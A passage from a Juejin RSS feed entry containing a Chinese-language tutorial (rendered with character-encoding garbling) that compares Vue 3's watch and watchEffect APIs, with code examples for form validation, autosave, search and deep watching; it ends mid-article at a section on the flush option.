<p>Three.jsçš„ä¸–ç•Œæ˜¯å¹¿é˜”çš„ï¼Œé€šè¿‡ä¸æ–­å®è·µå’Œæ¢ç´¢ï¼Œä½ å°†èƒ½å¤Ÿåˆ›é€ å‡ºä»¤äººæƒŠå¹çš„3D Webä½“éªŒã€‚å¸Œæœ›è¿™ä¸ªå…¥é—¨æ•™ç¨‹èƒ½å¤Ÿå¸®åŠ©ä½ è¿ˆå‡º3D Webå¼€å‘çš„ç¬¬ä¸€æ­¥ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue 3 æ·±åº¦è§£æï¼šwatch ä¸ watchEffect çš„ç»ˆæå¯¹å†³]]></title>    <link>https://juejin.cn/post/7589908657681727538</link>    <guid>https://juejin.cn/post/7589908657681727538</guid>    <pubDate>2026-01-01T14:00:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589908657681727538" data-draft-id="7589897523269402634" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue 3 æ·±åº¦è§£æï¼šwatch ä¸ watchEffect çš„ç»ˆæå¯¹å†³"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-01T14:00:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŒ—è¾°alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue 3 æ·±åº¦è§£æï¼šwatch ä¸ watchEffect çš„ç»ˆæå¯¹å†³
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŒ—è¾°alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T14:00:15.000Z" title="Thu Jan 01 2026 14:00:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue 3 æ·±åº¦è§£æï¼šwatch ä¸ watchEffect çš„ç»ˆæå¯¹å†³</h2>
<p>åœ¨ Vue 3 çš„å“åº”å¼ç³»ç»Ÿä¸­ï¼Œ<code>watch</code> å’Œ <code>watchEffect</code> æ˜¯ä¸¤ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œä½†è®¸å¤šå¼€å‘è€…å¯¹å®ƒä»¬çš„ä½¿ç”¨åœºæ™¯å’ŒåŒºåˆ«æ„Ÿåˆ°å›°æƒ‘ã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬å°†æ·±å…¥å‰–æè¿™ä¸¤ä¸ªAPIï¼Œå¸®åŠ©ä½ åšå‡ºæ˜æ™ºçš„é€‰æ‹©ï¼</p>
<h3 data-id="heading-1">ä¸€ã€åŸºç¡€æ¦‚å¿µè§£æ</h3>
<h4 data-id="heading-2">1.1 watchï¼šç²¾å‡†çš„å“åº”å¼ä¾¦æ¢</h4>
<p><code>watch</code> æ˜¯ä¸€ä¸ªç›¸å¯¹"ç²¾ç¡®"çš„è§‚å¯Ÿè€…ï¼Œå®ƒéœ€è¦ä½ æ˜ç¡®æŒ‡å®šè¦ç›‘å¬çš„æºï¼ˆsourceï¼‰å’Œå›è°ƒå‡½æ•°ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { ref, watch } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
<span class="hljs-keyword">const</span> user = <span class="hljs-title function_">ref</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'å°æ˜'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> })

<span class="hljs-comment">// ç›‘å¬å•ä¸ªref</span>
<span class="hljs-title function_">watch</span>(count, <span class="hljs-function">(<span class="hljs-params">newVal, oldVal</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`è®¡æ•°ä» <span class="hljs-subst">${oldVal}</span> å˜ä¸º <span class="hljs-subst">${newVal}</span>`</span>)
})

<span class="hljs-comment">// ç›‘å¬å“åº”å¼å¯¹è±¡</span>
<span class="hljs-title function_">watch</span>(
  <span class="hljs-function">() =&gt;</span> user.<span class="hljs-property">value</span>.<span class="hljs-property">age</span>,
  <span class="hljs-function">(<span class="hljs-params">newAge, oldAge</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å¹´é¾„ä» <span class="hljs-subst">${oldAge}</span> å˜ä¸º <span class="hljs-subst">${newAge}</span>`</span>)
  }
)

<span class="hljs-comment">// ç›‘å¬å¤šä¸ªæº</span>
<span class="hljs-title function_">watch</span>([count, <span class="hljs-function">() =&gt;</span> user.<span class="hljs-property">value</span>.<span class="hljs-property">age</span>], <span class="hljs-function">(<span class="hljs-params">[newCount, newAge], [oldCount, oldAge]</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`è®¡æ•°æˆ–å¹´é¾„å‘ç”Ÿå˜åŒ–`</span>)
})
</code></pre>
<h4 data-id="heading-3">1.2 watchEffectï¼šè‡ªåŠ¨çš„ä¾èµ–æ”¶é›†å™¨</h4>
<p><code>watchEffect</code> åˆ™æ›´åŠ "æ™ºèƒ½"å’Œ"è‡ªåŠ¨"ï¼Œå®ƒä¼šè‡ªåŠ¨è¿½è¸ªå…¶å›è°ƒå‡½æ•°å†…éƒ¨è®¿é—®çš„æ‰€æœ‰å“åº”å¼ä¾èµ–ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { ref, watchEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
<span class="hljs-keyword">const</span> double = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)

<span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// è‡ªåŠ¨è¿½è¸ª count.value å’Œ double.value</span>
  double.<span class="hljs-property">value</span> = count.<span class="hljs-property">value</span> * <span class="hljs-number">2</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`count: <span class="hljs-subst">${count.value}</span>, double: <span class="hljs-subst">${double.value}</span>`</span>)
})

<span class="hljs-comment">// è‡ªåŠ¨æ‰§è¡Œï¼Œè¾“å‡º: count: 0, double: 0</span>
count.<span class="hljs-property">value</span>++ <span class="hljs-comment">// è‡ªåŠ¨è§¦å‘ï¼Œè¾“å‡º: count: 1, double: 2</span>
</code></pre>
<h3 data-id="heading-4">äºŒã€æ ¸å¿ƒåŒºåˆ«å¯¹æ¯”</h3>
<p>è®©æˆ‘ç”¨ä¸€ä¸ªæµç¨‹å›¾æ¥å±•ç¤ºå®ƒä»¬çš„å·¥ä½œæœºåˆ¶å·®å¼‚ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[å¼€å§‹ç›‘å¬] --&gt; B{é€‰æ‹©å“ªç§æ–¹å¼?}
    
    B --&gt;|ç²¾ç¡®ç›‘å¬ç‰¹å®šæ•°æ®| C[ä½¿ç”¨ watch]
    B --&gt;|è‡ªåŠ¨è¿½è¸ªä¾èµ–| D[ä½¿ç”¨ watchEffect]
    
    C --&gt; C1[æ˜ç¡®æŒ‡å®šä¾èµ–æº]
    C1 --&gt; C2[åˆå§‹ä¸æ‰§è¡Œ&lt;br/&gt;é™¤éè®¾ç½® immediate: true]
    C2 --&gt; C3[å›è°ƒå‚æ•°åŒ…å«&lt;br/&gt;æ–°æ—§å€¼]
    C3 --&gt; C4[éœ€è¦æ‰‹åŠ¨æ¸…ç†?]
    C4 --&gt;|æ˜¯| C5[è¿”å›æ¸…ç†å‡½æ•°]
    C4 --&gt;|å¦| C6[ç›‘å¬å®Œæˆ]
    
    D --&gt; D1[æ‰§è¡Œå›è°ƒå‡½æ•°]
    D1 --&gt; D2[è‡ªåŠ¨æ”¶é›†ä¾èµ–]
    D2 --&gt; D3[ä¾èµ–å˜åŒ–æ—¶&lt;br/&gt;é‡æ–°æ‰§è¡Œ]
    D3 --&gt; D4[æ— æ–°æ—§å€¼å‚æ•°&lt;br/&gt;åªæœ‰æœ€æ–°å€¼]
    D4 --&gt; D6[ç›‘å¬å®Œæˆ]
    
    C5 --&gt; C6
</code></pre>
<h4 data-id="heading-5">2.1 ä¾èµ–è¿½è¸ªæ–¹å¼ä¸åŒ</h4>
<p><strong>watch</strong> éœ€è¦æ˜¾å¼å£°æ˜ä¾èµ–ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¿…é¡»æ˜ç¡®æŒ‡å®šè¦ç›‘å¬ä»€ä¹ˆ</span>
<span class="hljs-title function_">watch</span>(count, callback) <span class="hljs-comment">// ç›´æ¥ç›‘å¬ref</span>
<span class="hljs-title function_">watch</span>(<span class="hljs-function">() =&gt;</span> obj.<span class="hljs-property">prop</span>, callback) <span class="hljs-comment">// ç›‘å¬getterå‡½æ•°</span>
<span class="hljs-title function_">watch</span>([source1, source2], callback) <span class="hljs-comment">// ç›‘å¬æ•°ç»„</span>
</code></pre>
<p><strong>watchEffect</strong> è‡ªåŠ¨æ”¶é›†ä¾èµ–ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è‡ªåŠ¨å‘ç°å†…éƒ¨ä½¿ç”¨çš„æ‰€æœ‰å“åº”å¼æ•°æ®</span>
<span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// è¿™é‡Œç”¨åˆ°çš„æ‰€æœ‰å“åº”å¼æ•°æ®éƒ½ä¼šè¢«è‡ªåŠ¨è¿½è¸ª</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count.<span class="hljs-property">value</span> + user.<span class="hljs-property">value</span>.<span class="hljs-property">age</span>)
})
</code></pre>
<h4 data-id="heading-6">2.2 åˆå§‹æ‰§è¡Œæ—¶æœºä¸åŒ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> data = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)

<span class="hljs-comment">// watch é»˜è®¤ä¸ä¼šç«‹å³æ‰§è¡Œ</span>
<span class="hljs-title function_">watch</span>(data, <span class="hljs-function">(<span class="hljs-params">newVal</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ•°æ®å˜åŒ–:'</span>, newVal)
})
<span class="hljs-comment">// éœ€è¦ immediate: true æ‰ä¼šç«‹å³æ‰§è¡Œ</span>
<span class="hljs-title function_">watch</span>(data, callback, { <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span> })

<span class="hljs-comment">// watchEffect æ€»æ˜¯ç«‹å³æ‰§è¡Œä¸€æ¬¡</span>
<span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ•°æ®:'</span>, data.<span class="hljs-property">value</span>) <span class="hljs-comment">// ç«‹å³æ‰§è¡Œ</span>
})
</code></pre>
<h4 data-id="heading-7">2.3 è®¿é—®æ–°æ—§å€¼çš„æ–¹å¼ä¸åŒ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)

<span class="hljs-comment">// watch å¯ä»¥è®¿é—®æ–°æ—§å€¼</span>
<span class="hljs-title function_">watch</span>(count, <span class="hljs-function">(<span class="hljs-params">newVal, oldVal</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä» <span class="hljs-subst">${oldVal}</span> å˜ä¸º <span class="hljs-subst">${newVal}</span>`</span>)
})

<span class="hljs-comment">// watchEffect åªèƒ½è®¿é—®å½“å‰å€¼</span>
<span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å½“å‰å€¼: <span class="hljs-subst">${count.value}</span>`</span>)
  <span class="hljs-comment">// æ— æ³•ç›´æ¥è·å–æ—§å€¼</span>
})
</code></pre>
<h4 data-id="heading-8">2.4 åœæ­¢ç›‘å¬çš„æ–¹å¼</h4>
<p>ä¸¤ç§æ–¹å¼éƒ½è¿”å›åœæ­¢å‡½æ•°ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// watch çš„åœæ­¢æ–¹å¼</span>
<span class="hljs-keyword">const</span> stopWatch = <span class="hljs-title function_">watch</span>(count, callback)
<span class="hljs-title function_">stopWatch</span>() <span class="hljs-comment">// åœæ­¢ç›‘å¬</span>

<span class="hljs-comment">// watchEffect çš„åœæ­¢æ–¹å¼</span>
<span class="hljs-keyword">const</span> stopEffect = <span class="hljs-title function_">watchEffect</span>(callback)
<span class="hljs-title function_">stopEffect</span>() <span class="hljs-comment">// åœæ­¢ç›‘å¬</span>
</code></pre>
<h3 data-id="heading-9">ä¸‰ã€å®é™…åº”ç”¨åœºæ™¯</h3>
<h4 data-id="heading-10">åœºæ™¯1ï¼šè¡¨å•éªŒè¯ï¼ˆé€‚åˆä½¿ç”¨ watchï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { ref, watch } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> form = <span class="hljs-title function_">ref</span>({
  <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">email</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">password</span>: <span class="hljs-string">''</span>
})

<span class="hljs-keyword">const</span> errors = <span class="hljs-title function_">ref</span>({})

<span class="hljs-comment">// ç›‘å¬ç”¨æˆ·åå˜åŒ–</span>
<span class="hljs-title function_">watch</span>(
  <span class="hljs-function">() =&gt;</span> form.<span class="hljs-property">value</span>.<span class="hljs-property">username</span>,
  <span class="hljs-function">(<span class="hljs-params">newUsername</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (newUsername.<span class="hljs-property">length</span> &lt; <span class="hljs-number">3</span>) {
      errors.<span class="hljs-property">value</span>.<span class="hljs-property">username</span> = <span class="hljs-string">'ç”¨æˆ·åè‡³å°‘3ä¸ªå­—ç¬¦'</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">delete</span> errors.<span class="hljs-property">value</span>.<span class="hljs-property">username</span>
    }
  },
  { <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span> } <span class="hljs-comment">// ç«‹å³æ‰§è¡Œä»¥éªŒè¯åˆå§‹å€¼</span>
)

<span class="hljs-comment">// ç›‘å¬é‚®ç®±æ ¼å¼</span>
<span class="hljs-title function_">watch</span>(
  <span class="hljs-function">() =&gt;</span> form.<span class="hljs-property">value</span>.<span class="hljs-property">email</span>,
  <span class="hljs-function">(<span class="hljs-params">newEmail</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> emailRegex = <span class="hljs-regexp">/^[^\s@]+@[^\s@]+\.[^\s@]+$/</span>
    <span class="hljs-keyword">if</span> (!emailRegex.<span class="hljs-title function_">test</span>(newEmail)) {
      errors.<span class="hljs-property">value</span>.<span class="hljs-property">email</span> = <span class="hljs-string">'é‚®ç®±æ ¼å¼ä¸æ­£ç¡®'</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">delete</span> errors.<span class="hljs-property">value</span>.<span class="hljs-property">email</span>
    }
  }
)
</code></pre>
<h4 data-id="heading-11">åœºæ™¯2ï¼šè‡ªåŠ¨ä¿å­˜ï¼ˆé€‚åˆä½¿ç”¨ watchEffectï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { ref, watchEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> <span class="hljs-variable language_">document</span> = <span class="hljs-title function_">ref</span>({
  <span class="hljs-attr">title</span>: <span class="hljs-string">'æœªå‘½åæ–‡æ¡£'</span>,
  <span class="hljs-attr">content</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">lastSaved</span>: <span class="hljs-literal">null</span>
})

<span class="hljs-keyword">let</span> saveTimeout = <span class="hljs-literal">null</span>

<span class="hljs-comment">// è‡ªåŠ¨è¿½è¸ªæ–‡æ¡£å˜åŒ–å¹¶ä¿å­˜</span>
<span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">(<span class="hljs-params">onCleanup</span>) =&gt;</span> {
  <span class="hljs-comment">// æ¸…ç†ä¹‹å‰çš„å®šæ—¶å™¨</span>
  <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (saveTimeout) <span class="hljs-built_in">clearTimeout</span>(saveTimeout)
  })
  
  <span class="hljs-comment">// è®¾ç½®æ–°çš„å®šæ—¶å™¨</span>
  saveTimeout = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">value</span>.<span class="hljs-property">content</span>.<span class="hljs-title function_">trim</span>()) {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">saveToServer</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">value</span>)
        <span class="hljs-variable language_">document</span>.<span class="hljs-property">value</span>.<span class="hljs-property">lastSaved</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ–‡æ¡£å·²è‡ªåŠ¨ä¿å­˜'</span>)
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'ä¿å­˜å¤±è´¥:'</span>, error)
      }
    }
  }, <span class="hljs-number">1000</span>) <span class="hljs-comment">// é˜²æŠ–ï¼š1ç§’åä¿å­˜</span>
})
</code></pre>
<h4 data-id="heading-12">åœºæ™¯3ï¼šç»„åˆä½¿ç”¨</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { ref, watch, watchEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> searchQuery = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
<span class="hljs-keyword">const</span> searchResults = <span class="hljs-title function_">ref</span>([])
<span class="hljs-keyword">const</span> isLoading = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)

<span class="hljs-comment">// watchEffectï¼šè‡ªåŠ¨ç®¡ç† loading çŠ¶æ€å’Œè¯·æ±‚</span>
<span class="hljs-keyword">const</span> stopEffect = <span class="hljs-title function_">watchEffect</span>(<span class="hljs-keyword">async</span> (onCleanup) =&gt; {
  <span class="hljs-keyword">if</span> (!searchQuery.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>()) {
    searchResults.<span class="hljs-property">value</span> = []
    <span class="hljs-keyword">return</span>
  }
  
  isLoading.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
  
  <span class="hljs-comment">// æ¸…ç†å‡½æ•°ï¼šå–æ¶ˆæœªå®Œæˆçš„è¯·æ±‚</span>
  <span class="hljs-keyword">let</span> aborted = <span class="hljs-literal">false</span>
  <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
    aborted = <span class="hljs-literal">true</span>
    isLoading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
  })
  
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> results = <span class="hljs-keyword">await</span> <span class="hljs-title function_">searchAPI</span>(searchQuery.<span class="hljs-property">value</span>)
    <span class="hljs-keyword">if</span> (!aborted) {
      searchResults.<span class="hljs-property">value</span> = results
    }
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">if</span> (!aborted) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æœç´¢å¤±è´¥:'</span>, error)
      searchResults.<span class="hljs-property">value</span> = []
    }
  } <span class="hljs-keyword">finally</span> {
    <span class="hljs-keyword">if</span> (!aborted) {
      isLoading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    }
  }
})

<span class="hljs-comment">// watchï¼šç›‘å¬ç‰¹å®šæ¡ä»¶ï¼Œæ‰§è¡Œç‰¹å®šæ“ä½œ</span>
<span class="hljs-title function_">watch</span>(
  <span class="hljs-function">() =&gt;</span> searchResults.<span class="hljs-property">value</span>.<span class="hljs-property">length</span>,
  <span class="hljs-function">(<span class="hljs-params">newLength</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (newLength === <span class="hljs-number">0</span> &amp;&amp; searchQuery.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>()) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ²¡æœ‰æ‰¾åˆ°ç›¸å…³ç»“æœ'</span>)
    }
  }
)
</code></pre>
<h3 data-id="heading-13">å››ã€æ€§èƒ½ä¼˜åŒ–æŠ€å·§</h3>
<h4 data-id="heading-14">4.1 ä½¿ç”¨ watch çš„æ·±åº¦ç›‘å¬</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> nestedObj = <span class="hljs-title function_">ref</span>({
  <span class="hljs-attr">user</span>: {
    <span class="hljs-attr">profile</span>: {
      <span class="hljs-attr">name</span>: <span class="hljs-string">'å°æ˜'</span>,
      <span class="hljs-attr">details</span>: {
        <span class="hljs-attr">address</span>: <span class="hljs-string">'...'</span>
      }
    }
  }
})

<span class="hljs-comment">// æ·±åº¦ç›‘å¬</span>
<span class="hljs-title function_">watch</span>(
  nestedObj,
  <span class="hljs-function">(<span class="hljs-params">newVal</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å¯¹è±¡æ·±åº¦å˜åŒ–:'</span>, newVal)
  },
  { <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span> } <span class="hljs-comment">// æ·±åº¦ç›‘å¬</span>
)

<span class="hljs-comment">// å¯¹æ¯”ï¼šwatchEffect é»˜è®¤å°±æ˜¯"æ·±åº¦"çš„ï¼Œå› ä¸ºå®ƒè¿½è¸ªæ‰€æœ‰è®¿é—®</span>
<span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(nestedObj.<span class="hljs-property">value</span>.<span class="hljs-property">user</span>.<span class="hljs-property">profile</span>.<span class="hljs-property">details</span>.<span class="hljs-property">address</span>)
  <span class="hljs-comment">// ä»»ä½•å±‚æ¬¡çš„è®¿é—®éƒ½ä¼šè¢«è¿½è¸ª</span>
})
</code></pre>
<h4 data-id="heading-15">4.2 ä½¿ç”¨ flush é€‰é¡¹æ§åˆ¶æ‰§è¡Œæ—¶æœº</h4>
